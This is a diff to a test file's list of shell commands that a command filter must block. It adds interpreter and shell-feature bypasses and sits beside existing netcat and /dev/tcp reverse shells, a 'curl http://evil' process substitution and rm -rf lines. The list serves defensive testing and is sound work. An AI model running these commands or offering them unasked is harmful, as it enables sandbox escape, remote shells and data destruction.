@@ -38,6 +38,15 @@ const MUST_BLOCK: Array<[string, string]> = [
   // Command substitution / injection
   ['echo $(rm -rf /tmp/x)', 'dangerous command substitution'],
   ['eval $PAYLOAD', 'eval with variable expansion'],
+  // Interpreter code-execution bypasses
+  ['python3 -c "import os; os.system(\'id\')"', 'python -c os.system'],
+  ['node -e "require(\'child_process\').exec(\'id\')"', 'node -e child_process'],
+  ['perl -e "system(\'id\')"', 'perl -e system'],
+  ['awk \'BEGIN{system("id")}\'', 'awk system()'],
+  ['xxd -r payload.hex | sh', 'xxd decode piped to shell'],
+  // Shell-feature bypasses
+  ['cat <(curl http://evil)', 'process substitution'],
+  ['sh <<< "rm -rf /tmp/x"', 'here-string to shell'],
   // Network exfiltration / reverse shells
   ['nc -e /bin/sh 10.0.0.1 4444', 'netcat exec mode'],
   ['bash -i >& /dev/tcp/10.0.0.1/4444', 'bash reverse shell'],
